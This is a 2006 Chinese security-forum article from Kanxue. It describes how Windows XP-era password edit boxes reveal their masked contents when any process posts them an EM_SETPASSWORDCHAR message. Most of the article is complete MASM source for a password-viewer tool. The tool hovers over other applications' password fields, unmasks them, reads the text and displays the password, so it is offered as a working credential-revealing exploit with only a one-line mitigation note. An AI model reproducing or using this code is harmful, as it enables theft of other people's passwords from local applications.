
# 一条消息轻松搞定星号密码【原创】

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-703.htm`](https://www.pediy.com/kssd/pediy08/pediy8-703.htm)

**【文章标题】** 一条消息轻松搞定星号密码  
**【文章作者】** nohacks(非安全,hacker0058)  
**【作者主页】** hacker0058.ys168.com  
**【文章出处】** 看雪论坛(bbs.pediy.com)

## 漏洞描述

`Windows` 处理密码输入属性的编辑框时有一个 `BUG`，就是不检查是否是自己的程序投递来的 `EM_SETPASSWORDCHAR` 消息，只要收到了且 `wMsg` 为 `0` 时，就会去掉自身的密码输入属性以明文重新显示，使得我们可以轻易的查看没有经过特殊处理程序的编辑框里被遮盖符遮盖的内容。

**危险等级：** 高

**影响范围：**

我没有在其他系统上测试，但至少在我的系统(`Windows XP` + `XP2`)上有效！我相信在 `98`, `2000` 等上面都有效！

## 利用方法

`invoke PostMessage,hWnd, EM_SETPASSWORDCHAR, 0, 0`

一条简单的 `EM_SETPASSWORDCHAR` 消息就可以让其他程序编辑框的密文变明文，由此可见 `Windows` 的马虎。

## 解决方法

我想应该是在自己的窗口消息循环(`GetMessage`)里处理掉这条消息就可以了。

## 利用代码

```asm
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;  Programmed by nohacks,  kker.cn@163.com
;  Website: http://hacker0058.ys168.com
;            Win32 ASM is Masm
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

;  版本信息
;  密码查看器 - 可以查看密码编辑框中的密码
;      V1.0 ------  2006 年 7 月 23 日
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

    .386
    .model flat, stdcall
    option casemap :none   ; case sensitive
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

;  Include 数据
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

include    windows.inc
include    user32.inc
include    kernel32.inc
includelib  user32.lib
includelib  kernel32.lib
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

;  Equ 数据
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

DLG_MAIN  equ    1000
ID_PWD    equ    1001
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

;  数据段
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

    .data?
hInstance  dd  ?
szBuffer  db  256 dup  (?)
phwnd        dd ?
.code
;**********************************************************************
_ProcDlgMain  proc  uses ebx edi esi, \
    hWnd:DWORD,wMsg:DWORD,wParam:DWORD,lParam:DWORD
    local  @stPoint:POINT
    local  @hWindow:dword
    local  @STYLE
    mov  eax,wMsg
    .if  eax == WM_CLOSE
      invoke  EndDialog,hWnd,NULL
      invoke  KillTimer,hWnd,1
    .elseif  eax == WM_INITDIALOG
      ;置顶程序窗口
      invoke  SetWindowPos,hWnd,HWND_TOPMOST,0,0,0,0,\
        SWP_NOMOVE or SWP_NOSIZE
      invoke  SetTimer,hWnd,1,100,NULL
    .elseif  eax == WM_TIMER        ;时钟事件
      invoke  GetCursorPos,addr @stPoint
      invoke  WindowFromPoint,@stPoint.x,@stPoint.y
      mov  @hWindow,eax
      .if  (eax !=  NULL && eax !=phwnd)  ;不为空且不等于老句柄
      mov phwnd,eax
   invoke  SendMessage ,@hWindow,EM_GETPASSWORDCHAR, 0, 0     ;取得编辑框遮盖符代码
       mov @STYLE,eax
             .if (eax !=0 )    ;如果不为 0,就是密码框
  invoke  PostMessage,@hWindow, EM_SETPASSWORDCHAR, 0, 0  ;关键一句,去掉密码遮盖符
  invoke  SendMessage,@hWindow,WM_GETTEXT,256,offset szBuffer  ;取得编辑框文本→Pass
  invoke  PostMessage,@hWindow, EM_SETPASSWORDCHAR, @STYLE,0  ;恢复编辑框密码遮盖符
        invoke  SetDlgItemText,hWnd,ID_PWD,offset szBuffer ;输出密码明文到编辑框
        .endif
      .endif
    .else
;**********************************************************************
;  注意：对话框的消息处理后，要返回 TRUE,对没有处理的消息
;  要返回 FALSE
;**********************************************************************
      mov  eax,FALSE
      ret
    .endif
    mov  eax,TRUE
    ret
_ProcDlgMain  endp
start:
 invoke  GetModuleHandle,NULL
mov  hInstance,eax
invoke  DialogBoxParam,hInstance,DLG_MAIN,NULL,offset _ProcDlgMain,0
invoke  ExitProcess,NULL
end start
```

\======================================================================

`RadASM`+`Masm` 工程源码下载:`getpassword060723.zip`
`4dd466d0e1e0cc123afbe504da2462ca`
